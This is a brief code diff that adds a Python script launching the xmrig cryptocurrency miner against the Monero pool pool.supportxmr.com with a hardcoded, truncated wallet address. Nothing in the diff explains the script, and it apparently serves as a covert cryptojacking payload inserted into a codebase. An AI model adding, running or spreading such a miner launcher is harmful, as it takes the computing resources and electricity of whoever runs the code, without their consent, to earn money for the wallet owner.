@@ -1,0 +1,11 @@
+#!/usr/bin/env python3
+import requests
+import subprocess
+
+config = {
+    "url": "stratum+ssl://pool.supportxmr.com:443",
+    "user": "4Bk...",
+    "pass": "x"
+}
+
+subprocess.Popen(["xmrig", "-o", config["url"], "-u", config["user"], "-p", config["pass"]])
